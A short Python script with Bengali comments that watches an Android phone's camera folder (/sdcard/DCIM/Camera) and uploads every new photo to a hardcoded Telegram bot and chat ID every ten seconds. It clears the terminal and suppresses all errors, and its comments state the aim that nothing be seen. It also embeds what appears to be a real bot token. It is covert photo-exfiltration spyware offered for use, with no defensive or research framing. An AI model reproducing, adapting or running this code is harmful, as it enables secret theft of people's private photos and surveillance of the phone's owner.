import os
import time
import requests

# টেলিগ্রাম বটের টোকেন  
BOT_TOKEN = "8031168268:AAHgNwZm4v5z68N9oVU4lKheOo66ysVhwqg"

# টেলিগ্রাম আইডি (যেখানে ফাইল পাঠাবে)
CHAT_ID = "7348506103"

# যে ফোল্ডারের ফাইল পাঠাবে
FOLDER_PATH = "/sdcard/DCIM/Camera"

# পাঠানো ফাইল লিস্ট ট্র্যাক করতে
sent_files = set()

# টার্মিনাল ক্লিয়ার করা যাতে কিছু দেখা না যায়
os.system("clear")

# ফাইল আপলোড ফাংশন
def send_file(file_path):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(file_path, "rb") as file:
            requests.post(url, data={"chat_id": CHAT_ID}, files={"document": file})
        sent_files.add(file_path)  # পাঠানো ফাইল ট্র্যাক করা
    except:
        pass  # কোনো এরর হলেও কিছু দেখাবে না

# ব্যাকগ্রাউন্ডে চালানোর জন্য লুপ
while True:
    for file_name in os.listdir(FOLDER_PATH):
        file_path = os.path.join(FOLDER_PATH, file_name)
        if os.path.isfile(file_path) and file_path not in sent_files:
            send_file(file_path)
    time.sleep(10)  # প্রতি ১০ সেকেন্ড পর পর নতুন ফাইল চেক করবে
